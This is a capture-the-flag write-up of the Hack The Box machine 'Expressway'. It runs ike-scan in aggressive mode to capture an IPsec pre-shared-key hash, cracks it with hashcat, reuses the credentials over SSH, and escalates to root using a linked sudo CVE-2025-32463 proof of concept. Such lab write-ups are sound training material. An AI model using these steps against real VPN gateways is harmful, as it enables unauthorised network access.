---
slug: /write-up/htb/machines/easy/expressway
pagination_next: null
pagination_prev: null
draft: true
---

## Enumeration

Initial `nmap` scan reveals only TCP port 22 open:

```bash
└─$ nmap -A -p 22 -n -Pn 10.10.11.87    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 00:46 CEST
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 00:46 (0:00:00 remaining)
Nmap scan report for 10.10.11.87
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   185.19 ms 10.10.14.1
2   185.47 ms 10.10.11.87
```

Since there are not interested TCP ports, let's check UDP scan:

```bash
└─$ nmap 10.10.11.87 -sU --min-rate 5000 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 00:54 CEST
Nmap scan report for 10.10.11.87
Host is up (0.20s latency).
Not shown: 993 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
500/udp   open   isakmp
9876/udp  closed sd
19632/udp closed unknown
19647/udp closed unknown
33281/udp closed unknown
34577/udp closed unknown
49159/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 1.55 seconds
```

Port 500 UDP is used for `isakmp`. `isakmp` just defines a framework for key exchanges, the implementation is most likely donee with `IKE`. All of this is usually used for IPSec VPN.

## Foothold: Pentesting IKE

This [article](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html) defines some things we could check regarding missconfiguration of IKE implementation.

First of all, we need to determine if our computer can find any security combination (encrpytor, hash, etc ...) that allows communication with the IPSec gateway:

```bash
└─$ ike-scan -M 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=24b54798c0797fdc)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.295 seconds (3.39 hosts/sec).  1 returned handshake; 0 returned notify
```

`1 returned handshake` means there's at least one `SA` combination available for communication. The combination shows it is used `psk` a pre-shared key.

IKE offers two modes of negotiation, `Main mode` and `Aggressive mode`. According to [NSC](https://netseccloud.com/ike-aggressive-vs-main-mode):

- `Main mode`: Main Mode operates through a six-message exchange process, meticulously safeguarding the identities of the communicating parties through encryption. This mode is synonymous with robust security measures, ensuring that critical information remains concealed during the negotiation phase. Main Mode is the go-to choice in scenarios where identity protection and security are paramount. Its structured negotiation process makes it suitable for static IP environments, where the slight delay introduced by its thoroughness is a worthy trade-off for enhanced security.

- `Aggressive mode`: Aggressive Mode simplifies the negotiation process to just three messages, significantly speeding up the establishment of the VPN connection. Unlike Main Mode, it does not encrypt the identities of the negotiating parties in the initial messages, which can have implications for security but benefits the connection time. Aggressive Mode is particularly useful in scenarios where speed is a critical factor or when dynamic IP addresses are involved. Its ability to quickly establish VPN connections makes it ideal for situations requiring rapid, on-demand secure communications, such as remote access for mobile users.

In aggressive mode, if we managed to determine the `groupId` to use, we can get a hash of the pre-shared key. In this case getting the `groupId` was as easy as initiate the communication with aggressive mode:

```bash
└─$ ike-scan -A -M 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=773b1e6b116f6957)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.306 seconds (3.27 hosts/sec).  1 returned handshake; 0 returned notify
```

This is the line we're interested: `ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)`. Now that we got the `groupId`, we can use it to retrieve the PSK hash:

```bash
└─$ ike-scan -A -n "ike@expressway.htb" --pskcrack=/tmp/hash.txt -M 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=01043def9bbb7c8f)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 2.298 seconds (0.44 hosts/sec).  1 returned handshake; 0 returned notify
```

The hash is stored in `/tmp/hash.txt`. Now we can use hashcat to brute-force it.

```bash
hashcat -m 5400 /tmp/hash.txt -a 0  /usr/share/wordlists/rockyou.txt
```

And we got the pre-shared key. My initial idea was to try to connect to the IPSec tunnel and see what to go from there. Unfortunately, I couldn't do that because there's an additional layer of security (`XAUTH`) which ask for user and password.

The funny thing is that the discover user and password can be re-used to connect to the machine via SSH. This way we get access to the user flag.

## Privilege escalation

Looks like the sudo version is vulnerable to CVE-2025-32463: [https://github.com/K1tt3h/CVE-2025-32463-POC](https://github.com/K1tt3h/CVE-2025-32463-POC).

CVE-2025-32463 is a local privilege escalation vulnerability in sudo versions 1.9.14 through 1.9.17.

```bash
ike@expressway:/home$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

To achieve `root` access, it was as easy as downloading the POC from the github repo and running it in the machine.